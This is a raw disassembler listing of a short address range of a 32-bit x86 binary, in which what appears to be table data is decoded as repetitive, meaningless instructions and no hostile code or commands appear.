  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dl
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dl
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
